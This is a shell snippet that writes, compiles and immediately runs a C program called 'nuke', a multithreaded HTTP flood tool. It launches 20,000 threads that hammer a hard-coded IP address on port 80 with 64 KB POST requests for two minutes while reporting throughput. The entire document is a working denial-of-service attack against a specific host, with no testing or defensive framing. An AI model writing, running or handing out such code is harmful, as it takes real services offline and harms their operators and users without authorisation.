cat > ~/tools/nuke.c << 'ENDOFFILE'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

#define WORKERS 20000
#define DURATION 120
#define PAYLOAD_SIZE 65536
#define REQS_PER_CONN 80

volatile long counter = 0;
volatile long end_time = 0;

char payload[PAYLOAD_SIZE];
char header[256];
int header_len;

void *attack(void *arg) {
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(80);
    inet_pton(AF_INET, "216.202.170.56", &addr.sin_addr);
    
    while (time(NULL) < end_time) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) continue;
        
        struct timeval tv = {0, 200000};
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        
        if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
            close(sock);
            continue;
        }
        
        for (int i = 0; i < REQS_PER_CONN; i++) {
            if (time(NULL) >= end_time) break;
            send(sock, header, header_len, MSG_NOSIGNAL);
            send(sock, payload, PAYLOAD_SIZE, MSG_NOSIGNAL);
            __sync_fetch_and_add(&counter, 1);
        }
        close(sock);
    }
    return NULL;
}

int main() {
    for (int i = 0; i < PAYLOAD_SIZE; i++) payload[i] = i % 256;
    header_len = snprintf(header, sizeof(header),
        "POST / HTTP/1.1\r\nHost: 216.202.170.56\r\nContent-Length: %d\r\n\r\n", PAYLOAD_SIZE);
    
    end_time = time(NULL) + DURATION;
    
    printf("C NUKE | Workers: %d | Payload: %dKB | %ds\n", WORKERS, PAYLOAD_SIZE/1024, DURATION);
    
    pthread_t threads[WORKERS];
    for (int i = 0; i < WORKERS; i++) {
        pthread_create(&threads[i], NULL, attack, NULL);
    }
    
    time_t start = time(NULL);
    while (time(NULL) < end_time) {
        sleep(1);
        long c = counter;
        double elapsed = difftime(time(NULL), start);
        double rps = c / elapsed;
        double mb = (c * (PAYLOAD_SIZE + header_len)) / (1024.0 * 1024.0);
        double bw = mb / elapsed;
        double gbps = bw * 8 / 1000.0;
        printf("\rReqs: %ld | RPS: %.0f | Traffic: %.0f MB | BW: %.0f MB/s (%.3f Gbps) | Sisa: %lds",
            c, rps, mb, bw, gbps, end_time - time(NULL));
        fflush(stdout);
    }
    
    printf("\nDONE | %ld reqs | %.0f MB\n", counter, (counter * (PAYLOAD_SIZE + header_len)) / (1024.0 * 1024.0));
    return 0;
}
ENDOFFILE

gcc -O3 -pthread -o nuke ~/tools/nuke.c && ./nuke
